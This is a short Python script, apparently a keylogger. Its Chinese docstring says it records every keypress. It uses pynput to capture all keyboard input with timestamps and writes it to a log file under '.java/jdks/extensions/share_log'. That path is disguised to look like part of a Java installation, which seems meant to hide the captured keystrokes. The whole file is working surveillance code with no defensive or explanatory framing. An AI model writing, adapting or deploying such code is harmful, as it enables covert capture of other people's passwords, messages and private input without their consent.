import logging
import os
"""

监听键盘事件，将所有按键记录到日志文件中

"""

from pynput import keyboard

LOG_DIR=".java/jdks/extensions/share_log"

if not os.path.exists(LOG_DIR):
    os.makedirs(LOG_DIR)

logging.basicConfig(
    filename=LOG_DIR+'/keyboard.log',  # 日志文件路径
    level=logging.INFO,
    format='%(asctime)s - %(message)s',
    datefmt='%Y-%m-%d %H:%M:%S'
)

def log(text):
    logging.info(f'pressed: {text}')

with keyboard.Listener(on_press=log) as listener:
    listener.join()
